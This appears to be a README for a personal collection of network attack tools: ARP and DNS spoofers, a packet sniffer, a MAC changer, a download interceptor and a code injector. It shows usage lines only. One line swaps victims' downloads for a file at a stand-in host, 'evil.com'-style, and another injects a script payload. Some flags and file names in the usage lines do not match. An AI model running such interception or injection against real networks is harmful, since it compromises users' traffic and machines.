# Tools
Just miscellaneous tools that I have made to use for cyber security and network automation.

## MAC Address Changer
A Tool to Change MAC address

Usage: 	`macchanger.py -i wlan1 -m 42:69:42:69:42:69`

`-i, -iface, -interface` for your interface

`-m, --mac` for your desired mac address

## Network Scanner
A tool to scan the network for devices IP Addresses and MAC Addresses

Usage: `netscan.py -t 127.0.0.1/24`

`-t, --target` for your desired IP to scan

Note: You can scan subnet via `/24` and more by adding after the IP

## ARP Spoofer
A tool to spoof ARP traffic from the victims device to the Attacker

Usage: `arpspoof.py -t 127.0.0.1 -s 127.0.0.1`

`-t, --target` for your victims IP 

`-s, --spoof` for the gateway IP to spoof

## Network Sniffer
A Tool to sniff packets

Usage: 	`netsniff.py -i wlan1`

`-i, --iface, --interface` for your interface

## File Interceptor
A tool to intercept files on the network and replace them with the attackers

Usage: `intercept.py -e .exe -s http://example.com/evil.exe`

`-e, --ext` for your extension you want to replace

`-u --url` for the url of the file to change

## DNS Spoofer
A tool to spoof DNS traffic from the victims device to the Attacker

Usage: `dnsspoof.py -t example.com -ip 127.0.0.1`

`-t, --target` for your victims IP 

`-ip` for the IP to of the server to reroute to

## Code Injector
A Tool to inject code on network

Usage: 	`netsniff.py -i <script>alert('pwn');</script>`

`-i, --inject` for your code to inject
